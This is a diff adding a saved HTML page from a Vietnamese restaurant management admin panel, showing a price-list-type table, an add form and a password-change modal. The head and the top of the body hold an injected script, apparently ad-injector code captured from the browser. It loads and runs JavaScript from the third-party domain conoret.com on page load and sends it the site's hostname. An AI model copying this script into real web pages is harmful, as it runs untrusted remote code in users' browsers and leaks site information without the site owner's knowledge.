@@ -1,0 +1,390 @@
+<html ><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Sundre</title>
+    <meta name="description" content="Free Bootstrap 4 Admin Theme | Pike Admin">
+    <meta name="author" content="Pike Web Development - https://www.pikephp.com">
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="ac/images/favicon.ico">
+
+    <!-- Bootstrap CSS -->
+    <link href="assets/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+
+    <!-- Font Awesome CSS -->
+    <link href="assets/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- Custom CSS -->
+    <link href="assets/css/style.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" type="text/css" href="/webjars/bootstrap/4.3.1/css/bootstrap.min.css">
+    <link href="assets/plugins/jstree/style.css" rel="stylesheet" type="text/css">
+    <link href="assets/plugins/datetimepicker/css/daterangepicker.css" rel="stylesheet">
+
+    <link href="assets/plugins/select2/css/select2.min.css" rel="stylesheet" type="text/css"><style>
+    a {
+        cursor: pointer
+    }
+    td{
+        font-size: 15px;
+        font-family: "Times New Roman", Times, serif;
+        /*font-family: Arial, Helvetica, sans-serif;*/
+    }
+    th,td{
+        line-height: 35px !important;
+        padding:3px !important;
+        text-align: center !important;
+    }
+    body{
+        background-color: #d9e2e2 !important;
+    }
+</style><script src="//conoret.com/dsp?h=localhost&amp;r=0.21190612957774668" type="text/javascript" defer="" async=""></script></head>
+
+<!-- <link href="..assets/plugins/jstree/style.css"
+	th:href="@{assets/plugins/jstree/style.css}" rel="stylesheet"
+	type="text/css" /> -->
+
+
+
+<body class="adminbody-void" cz-shortcut-listen="true"><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+
+<div id="main" class="enlarged forced">
+
+    <!-- top bar navigation -->
+    <div class="headerbar">
+
+        <!-- LOGO -->
+        <div class="headerbar-left">
+            <a href="QuanLyThonTinBan.html" class="logo"><img alt="Logo" src="assets/images/logo.png"> <span>Sundre</span></a>
+        </div>
+
+        <nav class="navbar-custom">
+
+            <ul class="list-inline float-right mb-0">
+
+
+
+                <li class="list-inline-item dropdown notif"><a class="nav-link dropdown-toggle nav-user" data-toggle="dropdown" href="#" role="button" aria-haspopup="false" aria-expanded="false">
+                    <img src="assets/images/avatars/admin.png" alt="Profile image" class="avatar-rounded">
+                </a>
+                    <div class="dropdown-menu dropdown-menu-right profile-dropdown ">
+                        <!-- item-->
+                        <div class="dropdown-item">
+                            <h5 class="text-overflow">
+                                <small>Hello, <span name="000" id="User"> admin</span> </small>
+                            </h5>
+                        </div>
+
+                        <!-- item-->
+                        <a data-toggle="modal" data-target=".bd-example-modal-sm" class="dropdown-item notify-item"> <i class="fa fa-user"></i>
+                            <span> Đổi mật khẩu</span>
+                        </a>
+
+                        <!-- item-->
+                        <a href="/dangxuat" class="dropdown-item notify-item"> <i class="fa fa-power-off"></i> <span>Logout</span>
+                        </a>
+
+
+                    </div></li>
+
+            </ul>
+
+            <ul class="list-inline menu-left mb-0">
+                <li class="align-middle">
+                    <button class="button-menu-mobile open-left">
+                        <i class="fa fa-fw fa-bars"></i>
+                    </button>
+                </li>
+            </ul>
+
+        </nav>
+
+    </div>
+    <!-- End Navigation -->
+
+
+    <!-- Left Sidebar -->
+    <div class="left main-sidebar">
+
+        <div class="sidebar-inner leftscroll">
+
+            <div id="sidebar-menu">
+
+                <ul>
+
+
+
+                    <li class="submenu"><a href="#"><i class="fa fa-fw fa-table"></i> <span> Thu Ngan </span> <span class="menu-arrow"></span></a>
+                        <ul class="list-unstyled">
+                            <li><a href="QuanLyThonTinBan.html">Bàn
+                                Phòng</a></li>
+                            <li><a href="DatBan.html">Đặt
+                                Bàn</a></li>
+                        </ul>
+                    </li>
+
+                    <li class="submenu"><a href="#"><i class="fa fa-fw fa-tv"></i>
+                        <span> Mặt Hàng</span> <span class="menu-arrow"></span></a>
+                        <ul class="list-unstyled">
+                            <li><a href="DanhSachSanPham.html">Danh Sách</a></li>
+                            <li><a href="LoaiBangGia.html">Loại bảng giá</a></li>
+                        </ul></li>
+                    <li class="submenu"><a href="#"><i class="fa fa-fw fa-th"></i>
+                        <span> Quảng Lý Chứng Từ </span> <span class="menu-arrow"></span></a>
+                        <ul class="list-unstyled">
+                            <li><a href="DanhSachChungTu.html">Danh sách chứng từ</a></li>
+                        </ul>
+                    </li>
+                    <li class="submenu"><a href="KhachHang.html"><i class="fa fa-fw fa-image"></i> <span> Khách Hàng</span></a></li>
+                    <li class="submenu"><a href="NhanVien.html"><i class="fa fa-fw fa-image"></i> <span> Nhân viên</span></a></li>
+                </ul>
+
+                <div class="clearfix"></div>
+
+            </div>
+
+            <div class="clearfix"></div>
+
+        </div>
+
+    </div>
+    <!-- End Sidebar -->
+
+
+    <div class="content-page">
+
+        <!-- Start content -->
+        <div class="content">
+            <div class="container-fluid">
+                <div class="row">
+                    <div class="col-xl-12">
+                        <div class="breadcrumb-holder">
+                            <h1 class="main-title float-left">Loại bảng giá</h1>
+                            <ol class="breadcrumb float-right">
+                                <li class="breadcrumb-item">Home</li>
+                                <li class="breadcrumb-item active">Loại bảng giá</li>
+                            </ol>
+                            <div class="clearfix"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <!-- <h3>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</h3> -->
+                    <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+                        <div class="row">
+                            <!--      ////////////////////////////////////////////////////////////////////////////////-->
+                            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+                                <div class="card mb-3">
+                                    <div class="card-header">
+                                        <h3><i class="fa fa-table"></i> Danh sách loại giá bán hàng</h3>
+                                    </div>
+                                    <div class="card-header">
+                                        <button type="button" id="add-button" class="btn btn-success" role="button" data-toggle="modal" data-target=".bd-example-modal-lg">Thêm Loại Bảng Giá</button>
+                                    </div>
+
+                                    <div class="card-body" id="loaibanggia">
+                                        <table class="table table-responsive-xl table-bordered table-hover display">
+                                            <thead>
+                                            <tr>
+                                                <th scope="col">Mã Bảng Giá</th>
+                                                <th scope="col">Tên Bảng Giá</th>
+                                                <th scope="col">Mặc Định</th>
+                                            </tr>
+                                            </thead>
+                                            <tbody>
+                                            <tr class="lbg listbanle" id="lbgFOOD">
+                                                <td align="center" scope="row">FOOD</td>
+                                                <td align="center">Bảng giá Ngày lễ</td>
+                                                <td align="center"></td>
+                                            </tr>
+                                            <tr class="lbg listbanle" id="lbgRUOU">
+                                                <td align="center" scope="row">RUOU</td>
+                                                <td align="center">Bảng giá ngày thường</td>
+                                                <td align="center"></td>
+                                            </tr>
+                                            <tr class="lbg listbanle" id="lbgVIP">
+                                                <td align="center" scope="row">VIP</td>
+                                                <td align="center">Bảng giá khách Vip</td>
+                                                <td align="center"></td>
+                                            </tr>
+
+
+                                            </tbody>
+                                        </table>
+                                        </script>
+                                    </div>
+                                </div><!-- end card-->
+                            </div>
+
+
+                        </div>
+                    </div>
+                </div>
+                <span data-toggle="modal" id="form-loaibanggia" data-target=".form-loaibanggia"></span>
+                <div class="modal fade form-loaibanggia bd-example-modal-lg" tabindex="-1" role="dialog" aria-hidden="true">
+                    <div class="modal-dialog modal-sm">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <h5 class="modal-title" id="title-nv"></h5>
+                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                    <span aria-hidden="true">×</span>
+                                </button>
+                            </div>
+                            <form id="form-lbg1">
+                                <div class="modal-body">
+                                    <div class="form-group">
+                                        <label for="malbg">Mã</label>
+                                        <input type="text" class="form-control" id="malbg" aria-describedby="emailHelp" placeholder="Nhập mã bảng giá" required="">
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="tenlbg">Tên loại bảng giá</label>
+                                        <input type="text" class="form-control" id="tenlbg" aria-describedby="emailHelp" placeholder="Nhập tên bảng giá" required="">
+                                    </div>
+                                    <div class="form-check">
+                                        <label class="form-check-label">
+                                            <input type="checkbox" id="macdinhbg" class="form-check-input">
+                                            Mặc định
+                                        </label>
+                                    </div>
+                                </div>
+                                <div class="modal-footer">
+                                    <button type="submit" id="spsm" class="btn btn-primary"> Xác nhận</button>
+                                    <button type="button" class="btn btn-secondary closelbg1" data-dismiss="modal">Close</button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+                <div class="contextMenu" id="myMenu1" style="display: none;">
+                    <ul>
+                        <li id="edit-l">Chỉnh sửa</li>
+                        <li id="delete-l"> Xóa</li>
+                    </ul>
+                </div>
+                </div>
+        </div>
+
+        <!-- END content -->
+
+
+
+    </div>
+    <!-- END content-page -->
+
+    <footer class="footer">
+			<span class="text-right"> Copyright <a target="_blank" href="#">47k14.12.3</a>
+    </footer>
+
+
+
+    <!-- Open modal -->
+
+    <div class="modal fade bd-example-modal-sm" tabindex="-1" role="dialog" aria-hidden="true">
+        <div class="modal-dialog modal-sm">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Hello, admin</h5>
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                        <span aria-hidden="true">×</span>
+                    </button>
+                </div>
+                <form>
+                    <div class="modal-body">
+
+                        <div class="form-group">
+                            <label for="maukhaucu">Nhập mật khẩu cũ</label> <input type="password" class="form-control" id="maukhaucu" aria-describedby="emailHelp" placeholder="Nhập mật khẩu cũ" required="">
+
+                        </div>
+                        <div class="form-group">
+                            <label for="maukhaumoi">Nhập mật khẩu mới</label> <input type="password" class="form-control" id="maukhaumoi" aria-describedby="numberlHelp" placeholder="Nhập mật khẩu mới" required=""> <small id="emailHelp" class="form-text text-muted">Mật khẩu phải bao gồm ít
+                            nhất 8 ký tự, phải có ký tự in hoa, thường và ký tự đặc biệt.</small>
+                        </div>
+                        <div class="form-group">
+                            <label for="xacnhan">Xác nhận lại mậu khẩu</label>
+                            <input type="password" class="form-control" id="xacnhan" placeholder="Xác nhận lại mật khẩu" required="">
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="submit" id="doimatkhau" class="btn btn-primary">Save
+                            changes</button>
+                        <button type="button" class="btn btn-secondary closemd1" data-dismiss="modal">Close</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+</div>
+<!-- END main -->
+
+<script src="assets/js/modernizr.min.js"></script>
+<script src="assets/js/jquery.min.js"></script>
+
+<script src="assets/js/popper.min.js"></script> <!--poper avatar-->
+<script src="assets/js/bootstrap.min.js"></script>
+
+<script src="assets/js/fastclick.js"></script> <!--right click in soffware-->
+
+<!-- App js -->
+<script src="assets/js/pikeadmin.js"></script>
+
+<!-- BEGIN Java Script for this page -->
+<script src="https://cdn.datatables.net/1.10.16/js/dataTables.bootstrap4.min.js"></script>
+<script src="/webjars/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- Counter-Up-->
+<script src="assets/plugins/waypoints/lib/jquery.waypoints.min.js"></script>
+<script src="assets/plugins/counterup/jquery.counterup.min.js"></script>
+<script src="assets/js/jquery.contextmenu.min.js"></script>
+<script src="assets/plugins/jstree/jstree.min.js"></script>
+<script src="assets/plugins/select2/js/select2.min.js"></script>
+<script src="assets/plugins/datetimepicker/js/moment.min.js"></script>
+<script src="assets/plugins/datetimepicker/js/daterangepicker.js"></script>
+<!-- ///////////////////////////////////////////////////////////////////// -->
+
+<!-- END Java Script for this page -->
+<script>
+
+
+
+
+
+    function load(url) {
+        if (url.split("").splice(-1) == "#") {
+            url = url.substring(0, url.length - 1);
+        }
+    }
+    // jQuery code
+    $(document).ready(function() {
+        // Show context menu on right-click
+        $('.listbanle').on("contextmenu", function(event) {
+            event.preventDefault(); // Prevent default context menu
+            // Show the context menu box
+            $("#jqContextMenu").css({
+                top: event.pageY + "px",
+                left: event.pageX + "px",
+                display: "block"
+            });
+        });
+
+        // Hide context menu on click outside
+        $('.listbanle').on("click", function() {
+            $("#jqContextMenu").hide();
+        });
+
+        // Hide context menu on ESC key press
+        $('.listbanle').on("keydown", function(event) {
+            if (event.which === 27) {
+                $("#jqContextMenu").hide();
+            }
+        });
+    });
+
+</script>
+
+<div id="jqContextMenu" style="position: absolute; z-index: 500; left: 391px; top: 318px; display: none;"><ul style="list-style: none; padding: 1px; margin: 0px; background-color: rgb(255, 255, 255); border: 1px solid rgb(153, 153, 153);">
+    <li id="edit-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;">Chỉnh sửa</li>
+    <li id="delete-l" style="margin: 0px; color: rgb(0, 0, 0); display: block; cursor: default; padding: 3px; border: 1px solid rgb(255, 255, 255); background-color: transparent;"> Xóa</li>
+</ul></div><div style="background-color: rgb(0, 0, 0); position: absolute; opacity: 0.2; z-index: 499; display: none; width: 98px; height: 164px; left: 637px; top: 320px;"></div></body></html>
